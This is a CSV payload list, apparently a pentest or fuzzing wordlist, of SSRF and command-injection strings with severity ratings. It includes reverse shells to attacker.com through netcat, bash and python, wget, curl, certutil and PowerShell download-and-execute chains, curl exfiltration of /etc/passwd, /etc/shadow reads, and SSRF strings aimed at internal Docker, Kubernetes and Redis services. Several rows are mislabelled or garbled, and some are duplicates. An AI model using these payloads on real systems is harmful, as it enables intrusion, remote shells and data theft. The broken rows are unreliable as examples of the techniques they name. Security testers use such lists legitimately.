id,description,payload,context,type,severity,example_query,example_usage
ssrf-007,SSRF to internal Memcached service,memcached://127.0.0.1:11211,Access internal Memcached,SSRF,high,,
ssrf-008,SSRF to internal FTP server,ftp://127.0.0.1/,Access internal FTP,SSRF,medium,,
ssrf-009,SSRF to internal SMB share,smb://192.168.1.100/share,Access internal SMB share,SSRF,high,,
ssrf-010,SSRF to internal Docker API,http://127.0.0.1:2375/containers/json,Access Docker API,SSRF,critical,,
ssrf-011,SSRF to internal Kubernetes API,https://kubernetes.default.svc/api,Access Kubernetes API,SSRF,critical,,
ssrf-012,SSRF to internal Jenkins API,http://127.0.0.1:8080/api/json,Access Jenkins API,SSRF,high,,
ssrf-013,SSRF to internal Elasticsearch cluster,http://127.0.0.1:9200/_cat/indices?v,Access Elasticsearch,SSRF,high,,
ssrf-014,SSRF to internal RabbitMQ management API,http://127.0.0.1:15672/api/overview,Access RabbitMQ API,SSRF,high,,
ssrf-015,SSRF to internal MySQL service,mysql://127.0.0.1:3306,Access MySQL service,SSRF,high,,
ssrf-016,SSRF to internal PostgreSQL service,postgresql://127.0.0.1:5432,Access PostgreSQL service,SSRF,high,,
ssrf-017,SSRF to internal SMTP server,smtp://127.0.0.1:25,Access SMTP server,SSRF,medium,,
ssrf-018,SSRF to internal SNMP service,snmp://127.0.0.1,Access SNMP service,SSRF,medium,,
ssrf-019,SSRF to internal LDAP service,ldap://127.0.0.1:389,Access LDAP service,SSRF,high,,
ssrf-021,SSRF with URL encoded internal IP,http://%31%39%32.%31%36%38.%31.%31/,URL encoded internal IP,SSRF,high,,
ssrf-022,SSRF with octal encoded IP,http://0300.0250.0001.0001/,Octal encoded IP address,SSRF,high,,
ssrf-023,SSRF with decimal encoded IP,http://3232235777/,Decimal encoded IP address,SSRF,high,,
ssrf-024,SSRF with IPv6 loopback,http://[::1]/,IPv6 localhost,SSRF,high,,
ssrf-025,SSRF with file protocol to read local file,file:///etc/passwd,Local file read attempt,SSRF,critical,,
ssrf-026,SSRF with gopher protocol to send raw TCP,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,Gopher protocol to Redis,SSRF,critical,,
ssrf-027,SSRF with data URI scheme,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4=",Data URI with embedded script,SSRF,medium,,
ssrf-028,SSRF with javascript URI scheme,javascript:alert('SSRF'),JavaScript URI scheme,SSRF,low,,
ssrf-029,SSRF with file descriptor access,file:///proc/self/environ,Access process environment,SSRF,critical,,
ssrf-030,SSRF with nested URL encoding,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd,Nested URL encoded path traversal,SSRF,critical,,
ssrf-031,SSRF with FTP protocol and directory traversal,ftp://127.0.0.1/../../../../etc/passwd,FTP directory traversal,SSRF,critical,,
ssrf-032,SSRF with SMB protocol and UNC path,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts,SMB UNC path traversal,SSRF,critical,,
ssrf-033,SSRF with HTTP request smuggling attempt,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,HTTP request smuggling,SSRF,critical,,
ssrf-034,SSRF with HTTP header injection,"http://127.0.0.1:80/
X-Injected-Header: evil",HTTP header injection,SSRF,critical,,
ssrf-035,SSRF with HTTP basic auth to internal service,http://admin:password@127.0.0.1/admin,Basic auth credentials,SSRF,high,,
ssrf-036,SSRF with HTTP redirect to internal IP,http://external.com/redirect?url=http://127.0.0.1/,Redirect to internal IP,SSRF,high,,
ssrf-037,SSRF with DNS rebinding attack,http://evil.com/,DNS rebinding to internal IP,SSRF,critical,,
ssrf-038,SSRF with IPv4 mapped IPv6 address,http://[::ffff:127.0.0.1]/,IPv4 mapped IPv6,SSRF,high,,
ssrf-039,SSRF with encoded newline characters,http://127.0.0.1/%0a%0d,Encoded newline injection,SSRF,medium,,
ssrf-040,SSRF with HTTP POST method override,http://127.0.0.1/?_method=POST,Method override parameter,SSRF,medium,,
ssrf-041,SSRF with HTTP chunked transfer encoding,http://127.0.0.1/chunked,Chunked transfer encoding test,SSRF,medium,,
ssrf-042,SSRF with HTTP TRACE method,http://127.0.0.1/trace,HTTP TRACE method test,SSRF,medium,,
ssrf-043,SSRF with HTTP OPTIONS method,http://127.0.0.1/options,HTTP OPTIONS method test,SSRF,medium,,
ssrf-044,SSRF with HTTP CONNECT method,http://127.0.0.1/connect,HTTP CONNECT method test,SSRF,medium,,
ssrf-045,SSRF with HTTP PATCH method,http://127.0.0.1/patch,HTTP PATCH method test,SSRF,medium,,
ssrf-046,SSRF with HTTP DELETE method,http://127.0.0.1/delete,HTTP DELETE method test,SSRF,medium,,
ssrf-047,SSRF with HTTP PUT method,http://127.0.0.1/put,HTTP PUT method test,SSRF,medium,,
ssrf-048,HTTP PUT method test,http://127.0.0.1/put,HTTP PUT method test,SSRF,medium,,
ssrf-049,SSRF with HTTP header injection via URL,"http://127.0.0.1/
X-Forwarded-For: 127.0.0.1",Inject X-Forwarded-For header,SSRF,high,,
ssrf-051,SSRF with dict protocol to query dictionary service,dict://127.0.0.1/,Access internal dictionary service,SSRF,medium,,
ssrf-052,SSRF with telnet protocol,telnet://127.0.0.1:23,Access internal telnet service,SSRF,medium,,
ssrf-053,SSRF with ldap protocol to query LDAP server,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid",LDAP query,SSRF,high,,
ssrf-054,SSRF with rdp protocol,rdp://127.0.0.1:3389,Access internal RDP service,SSRF,medium,,
ssrf-055,SSRF with smb protocol to access Windows share,smb://127.0.0.1/share,Access SMB share,SSRF,high,,
ssrf-056,SSRF with nfs protocol,nfs://127.0.0.1/export,Access NFS export,SSRF,medium,,
ssrf-057,SSRF with imap protocol,imap://127.0.0.1:143,Access IMAP mail server,SSRF,medium,,
ssrf-058,SSRF with pop3 protocol,pop3://127.0.0.1:110,Access POP3 mail server,SSRF,medium,,
ssrf-059,SSRF with mqtt protocol,mqtt://127.0.0.1:1883,Access MQTT broker,SSRF,medium,,
ssrf-060,SSRF with ws protocol (WebSocket),ws://127.0.0.1:8080/,Access WebSocket service,SSRF,medium,,
ssrf-061,SSRF with wss protocol (Secure WebSocket),wss://127.0.0.1:8443/,Access secure WebSocket service,SSRF,medium,,
ssrf-062,SSRF with bitcoin protocol,bitcoin://127.0.0.1/,Bitcoin protocol scheme,SSRF,low,,
ssrf-063,SSRF with magnet protocol,magnet:?xt=urn:btih:abcdef1234567890,Magnet link protocol,SSRF,low,,
ssrf-064,SSRF with ssh protocol,ssh://127.0.0.1:22,Access SSH service,SSRF,medium,,
ssrf-065,SSRF with tel protocol,tel:+1234567890,Telephone protocol,SSRF,low,,
ssrf-066,SSRF with sms protocol,sms:+1234567890,SMS protocol,SSRF,low,,
ssrf-067,SSRF with geo protocol,"geo:37.786971,-122.399677",Geolocation protocol,SSRF,low,,
ssrf-068,SSRF with svn protocol,svn://127.0.0.1/repo,Subversion protocol,SSRF,medium,,
ssrf-069,SSRF with git protocol,git://127.0.0.1/repo.git,Git protocol,SSRF,medium,,
ssrf-071,SSRF with double URL encoding,http://%2531%25327%2532%253E%253E%253E/,Double URL encoded IP,SSRF,high,,
ssrf-072,SSRF with mixed case scheme to bypass filters,HtTp://127.0.0.1/,Mixed case HTTP scheme,SSRF,medium,,
ssrf-073,SSRF with embedded null byte to bypass filters,http://127.0.0.1%00.example.com/,Null byte injection,SSRF,high,,
ssrf-074,SSRF with CRLF injection in URL,"http://127.0.0.1/
Set-Cookie:evil=1",CRLF injection,SSRF,critical,,
ssrf-075,SSRF with protocol chaining using gopher,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,Gopher protocol to Redis,SSRF,critical,,
ssrf-076,SSRF with IPv6 embedded IPv4 and port,http://[::ffff:192.168.1.1]:8080/,IPv6 embedded IPv4 with port,SSRF,high,,
ssrf-077,SSRF with DNS rebinding via external domain,http://evil.com/,DNS rebinding attack,SSRF,critical,,
ssrf-078,SSRF with HTTP header injection via URL encoding,http://127.0.0.1/%0d%0aX-Injected-Header:evil,HTTP header injection,SSRF,critical,,
ssrf-079,SSRF with HTTP request smuggling attempt,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,Request smuggling,SSRF,critical,,
ssrf-080,SSRF with file protocol and directory traversal,file:///etc/passwd%00,File read with null byte,SSRF,critical,,
ssrf-081,SSRF with HTTP basic auth and URL encoding,http://admin%3Apassword@127.0.0.1/,Basic auth with encoding,SSRF,high,,
ssrf-082,SSRF with HTTP redirect to internal IP,http://external.com/redirect?url=http://127.0.0.1/,Redirect to internal IP,SSRF,high,,
ssrf-083,SSRF with HTTP POST method override,http://127.0.0.1/?_method=POST,Method override,SSRF,medium,,
ssrf-084,SSRF with HTTP chunked transfer encoding,http://127.0.0.1/chunked,Chunked transfer encoding,SSRF,medium,,
ssrf-085,SSRF with HTTP TRACE method,http://127.0.0.1/trace,HTTP TRACE method,SSRF,medium,,
ssrf-086,SSRF with HTTP OPTIONS method,http://127.0.0.1/options,HTTP OPTIONS method,SSRF,medium,,
ssrf-087,SSRF with HTTP CONNECT method,http://127.0.0.1/connect,HTTP CONNECT method,SSRF,medium,,
ssrf-088,SSRF with HTTP PATCH method,http://127.0.0.1/patch,HTTP PATCH method,SSRF,medium,,
ssrf-089,SSRF with HTTP DELETE method,http://127.0.0.1/delete,HTTP DELETE method,SSRF,medium,,
ssrf-090,SSRF with HTTP PUT method,http://127.0.0.1/put,HTTP PUT method,SSRF,medium,,
ssrf-091,SSRF with IPv4 in hexadecimal,http://0x7f.0x0.0x0.0x1/,Hexadecimal IPv4 address,SSRF,high,,
ssrf-092,SSRF with IPv4 in mixed notation,http://127.1/,Shortened IPv4 address,SSRF,high,,
ssrf-093,SSRF with IPv4 in integer format,http://2130706433/,Integer IPv4 address,SSRF,high,,
ssrf-094,SSRF with HTTP userinfo section to bypass filters,http://127.0.0.1@evil.com/,Userinfo in URL,SSRF,high,,
ssrf-095,SSRF with HTTP URL fragment,http://127.0.0.1/#fragment,URL fragment,SSRF,low,,
ssrf-096,SSRF with HTTP URL query parameter injection,http://127.0.0.1/?param=value,Query parameter,SSRF,low,,
ssrf-097,SSRF with HTTP URL path traversal,http://127.0.0.1/../../../../etc/passwd,Path traversal,SSRF,critical,,
ssrf-098,SSRF with HTTP URL encoded path traversal,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd,URL encoded path traversal,SSRF,critical,,
ssrf-099,SSRF with HTTP URL encoded double slash,http://127.0.0.1/%2f%2f/etc/passwd,Encoded double slash,SSRF,critical,,
cmdinj-001,Basic command injection with semicolon,; ls -la,Inject list directory command,Command Injection,high,,
cmdinj-002,Command injection with && operator,&& cat /etc/passwd,Inject read passwd file,Command Injection,critical,,
cmdinj-003,Command injection with pipe operator,| whoami,Inject whoami command,Command Injection,high,,
cmdinj-004,Command injection with backticks,id,Inject id command using backticks,Command Injection,high,,
cmdinj-005,Command injection with $() syntax,$(uname -a),Inject uname command,Command Injection,high,,
cmdinj-006,Command injection with nested $(),$(echo $(whoami)),Nested command substitution,Command Injection,high,,
cmdinj-007,Command injection with ampersand and sleep,& sleep 10,Inject sleep command for timing attack,Command Injection,medium,,
cmdinj-008,Command injection with newline character,"&& echo 'injected'
",Inject command with newline,Command Injection,high,,
cmdinj-009,Command injection with semicolon and curl,; curl http://attacker.com,Exfiltrate data via curl,Command Injection,critical,,
cmdinj-010,Command injection with semicolon and wget,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute malware,Command Injection,critical,,
cmdinj-011,Command injection with pipe and netcat reverse shell,| nc attacker.com 4444 -e /bin/sh,Reverse shell via netcat,Command Injection,critical,,
cmdinj-012,Command injection with backticks and whoami,whoami,Execute whoami command,Command Injection,high,,
cmdinj-013,Command injection with $() and id,$(id),Execute id command,Command Injection,high,,
cmdinj-014,Command injection with semicolon and echo,; echo injected,Simple echo injection,Command Injection,medium,,
cmdinj-015,Command injection with && and cat /etc/shadow,&& cat /etc/shadow,Read shadow file,Command Injection,critical,,
cmdinj-016,Command injection with semicolon and id,; id,Execute id command,Command Injection,high,,
cmdinj-017,Command injection with pipe and env,| env,Print environment variables,Command Injection,medium,,
cmdinj-018,Command injection with backticks and ls,ls /,List root directory,Command Injection,high,,
cmdinj-019,Command injection with $() and ps,$(ps aux),List running processes,Command Injection,medium,,
cmdinj-021,Command injection with URL encoding,%3B%20id,URL encoded semicolon and id command,Command Injection,high,,
cmdinj-022,Command injection with nested backticks,`echo \whoami\`,Nested backticks execution,Command Injection,high,,
cmdinj-023,Command injection with environment variable,; echo $USER,Print current user environment variable,Command Injection,medium,,
cmdinj-024,Command injection with hex encoded characters,; echo injected,Hex encoded space character,Command Injection,medium,,
cmdinj-025,Command injection with base64 encoded command,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,Command Injection,critical,,
cmdinj-026,Command injection with command substitution and sleep,$(sleep 10),Timing attack with sleep,Command Injection,medium,,
cmdinj-027,Command injection with semicolon and nested $(),; echo $(whoami),Nested command substitution,Command Injection,high,,
cmdinj-028,Command injection with backslash escaping,; echo injected\; ls,Escape semicolon,Command Injection,medium,,
cmdinj-029,Command injection with multiple command separators,; ls -la && whoami || echo failed,Multiple command chaining,Command Injection,high,,
cmdinj-030,Command injection with command grouping,; (id; uname -a),Grouped commands,Command Injection,high,,
cmdinj-031,Command injection with subshell,; (sleep 5),Subshell with sleep,Command Injection,medium,,
cmdinj-032,Command injection with command chaining and comments,; ls -la #,Command injection with comment,Command Injection,medium,,
cmdinj-033,Command injection with backticks and nested $(),echo $(whoami),Nested command execution,Command Injection,high,,
cmdinj-034,Command injection with semicolon and environment variable expansion,; echo $PATH,Print PATH environment variable,Command Injection,medium,,
cmdinj-035,Command injection with command substitution and echo,$(echo injected),Echo injected string,Command Injection,medium,,
cmdinj-036,Command injection with semicolon and nested subshell,; (echo injected; whoami),Multiple commands in subshell,Command Injection,high,,
cmdinj-037,Command injection with semicolon and sleep for timing,; sleep 15,Timing attack,Command Injection,medium,,
cmdinj-038,Command injection with pipe and reverse shell,| nc attacker.com 4444 -e /bin/sh,Reverse shell via netcat,Command Injection,critical,,
cmdinj-039,Command injection with semicolon and wget download,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute script,Command Injection,critical,,
cmdinj-040,Command injection with semicolon and curl download,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Download and execute script,Command Injection,critical,,
cmdinj-041,Command injection with semicolon and base64 decode,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,Command Injection,critical,,
cmdinj-042,Command injection with semicolon and environment variable manipulation,; export MALICIOUS=1,Set environment variable,Command Injection,medium,,
cmdinj-043,Command injection with semicolon and echo to file,; echo 'malicious' > /tmp/malicious.txt,Write to file,Command Injection,medium,,
cmdinj-044,Command injection with semicolon and chmod,; chmod +x /tmp/m.sh,Change file permissions,Command Injection,medium,,
cmdinj-045,Command injection with semicolon and cat /etc/shadow,; cat /etc/shadow,Read shadow file,Command Injection,critical,,
cmdinj-046,Command injection with semicolon and echo with special characters,; echo 'injected; ls -la',Echo with special characters,Command Injection,medium,,
cmdinj-047,Command injection with semicolon and nested command with quotes,"; echo ""$(whoami)""",Nested command with quotes,Command Injection,high,,
cmdinj-048,Command injection with semicolon and awk command,"; awk 'BEGIN {system(""id"")}'",Execute command via awk,Command Injection,high,,
cmdinj-049,Command injection with semicolon and perl command,; perl -e 'print id',Execute command via perl,Command Injection,high,,
cmdinj-051,Windows cmd injection with & separator,& whoami,Execute whoami command,Command Injection,high,,
cmdinj-052,Windows cmd injection with | separator,| dir,List directory contents,Command Injection,high,,
cmdinj-053,Windows cmd injection with && separator,&& ipconfig,Display network config,Command Injection,high,,
cmdinj-054,Windows cmd injection with || separator,|| net user,List users,Command Injection,high,,
cmdinj-055,Windows PowerShell injection with semicolon,; Get-Process,List running processes,Command Injection,high,,
cmdinj-056,Windows PowerShell injection with backtick,whoami,Execute whoami,Command Injection,high,,
cmdinj-057,Windows PowerShell injection with $(),$(Get-ChildItem),List directory contents,Command Injection,high,,
cmdinj-058,Windows PowerShell injection with Start-Process,; Start-Process notepad.exe,Launch notepad,Command Injection,medium,,
cmdinj-059,Windows cmd injection with echo to file,& echo injected > C:\Windows\Temp\injected.txt,Write to file,Command Injection,medium,,
cmdinj-060,Windows cmd injection with netcat reverse shell,& nc attacker.com 4444 -e cmd.exe,Reverse shell,Command Injection,critical,,
cmdinj-061,macOS/Linux injection with semicolon and whoami,; whoami,Execute whoami,Command Injection,high,,
cmdinj-062,macOS/Linux injection with pipe and id,| id,Execute id,Command Injection,high,,
cmdinj-063,macOS/Linux injection with && and uname,&& uname -a,System info,Command Injection,high,,
cmdinj-064,macOS/Linux injection with backticks and ls,ls /,List root directory,Command Injection,high,,
cmdinj-065,macOS/Linux injection with $() and ps,$(ps aux),List processes,Command Injection,medium,,
cmdinj-066,macOS/Linux injection with semicolon and curl download,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Download and execute script,Command Injection,critical,,
cmdinj-067,macOS/Linux injection with semicolon and wget download,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute script,Command Injection,critical,,
cmdinj-068,macOS/Linux injection with semicolon and base64 decode,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,Command Injection,critical,,
cmdinj-069,Windows PowerShell injection with encoded command,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=,Encoded PowerShell command,Command Injection,high,,
cmdinj-070,Windows cmd injection with for loop,"& for /L %i in (1,1,5) do @echo %i",Loop command,Command Injection,medium,,
cmdinj-071,Windows PowerShell injection with Invoke-Expression,; Invoke-Expression 'whoami',Execute command,Command Injection,high,,
cmdinj-072,macOS/Linux injection with semicolon and env,; env,Print environment variables,Command Injection,medium,,
cmdinj-073,macOS/Linux injection with semicolon and cat /etc/passwd,; cat /etc/passwd,Read passwd file,Command Injection,critical,,
cmdinj-074,Windows cmd injection with reg query,& reg query HKLM\Software,Query registry,Command Injection,medium,,
cmdinj-075,Windows PowerShell injection with Get-Content,; Get-Content C:\Windows\System32\drivers\etc\hosts,Read hosts file,Command Injection,high,,
cmdinj-076,macOS/Linux injection with semicolon and dmesg,; dmesg,Kernel messages,Command Injection,medium,,
cmdinj-077,macOS/Linux injection with semicolon and netstat,; netstat -an,Network connections,Command Injection,medium,,
cmdinj-078,Windows cmd injection with tasklist,& tasklist,List running tasks,Command Injection,medium,,
cmdinj-079,Windows PowerShell injection with Get-Service,; Get-Service,List services,Command Injection,medium,,
cmdinj-080,macOS/Linux injection with semicolon and ps aux,; ps aux,List processes,Command Injection,medium,,
cmdinj-081,Windows cmd injection with echo and pipe,& echo injected | findstr injected,Echo and filter output,Command Injection,medium,,
cmdinj-082,Windows PowerShell injection with Start-Process and hidden window,; Start-Process notepad.exe -WindowStyle Hidden,Launch process hidden,Command Injection,medium,,
cmdinj-083,macOS/Linux injection with semicolon and curl to exfiltrate data,; curl http://attacker.com/?data=$(cat /etc/passwd),Exfiltrate data via curl,Command Injection,critical,,
cmdinj-084,Windows cmd injection with powershell encoded command,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Encoded PowerShell payload,Command Injection,high,,
cmdinj-085,macOS/Linux injection with semicolon and nc reverse shell,; nc attacker.com 4444 -e /bin/bash,Reverse shell via netcat,Command Injection,critical,,
cmdinj-086,Windows cmd injection with certutil download,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Download and execute file,Command Injection,critical,,
cmdinj-087,macOS/Linux injection with semicolon and bash reverse shell,; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Reverse shell via bash,Command Injection,critical,,
cmdinj-088,Windows PowerShell injection with Invoke-WebRequest,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Download and execute PowerShell script,Command Injection,critical,,
cmdinj-089,macOS/Linux injection with semicolon and python reverse shell,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Reverse shell via python,Command Injection,critical,,
cmdinj-091,Obfuscated command injection using environment variable concatenation,; e${IFS}cho injected,Bypass simple filters using ${IFS} (space) variable,Command Injection,high,,
cmdinj-092,Command injection using Unicode encoding,; echo injected,Unicode encoded echo command,Command Injection,high,,
cmdinj-093,Command injection with double URL encoding,%253B%2520id,Double URL encoded semicolon and id,Command Injection,high,,
cmdinj-094,Command injection using variable substitution and command chaining,; VAR=whoami; $VAR,Use variable to execute command,Command Injection,high,,
cmdinj-095,Command injection using nested base64 decoding and execution,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash,Decode and execute base64 payload,Command Injection,critical,,
cmdinj-096,Command injection using less common command separator (newline),"&& echo injected
id",Use newline as command separator,Command Injection,high,,
cmdinj-097,Command injection using PowerShell encoded command with obfuscation,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Obfuscated PowerShell encoded command,Command Injection,critical,,
cmdinj-098,Command injection using command substitution with nested quotes,"; echo $(echo ""$(whoami)"")",Nested command substitution with quotes,Command Injection,high,,
cmdinj-099,Command injection using environment variable and indirect expansion,; export CMD=whoami; ${CMD},Indirect command execution via env var,Command Injection,high,,
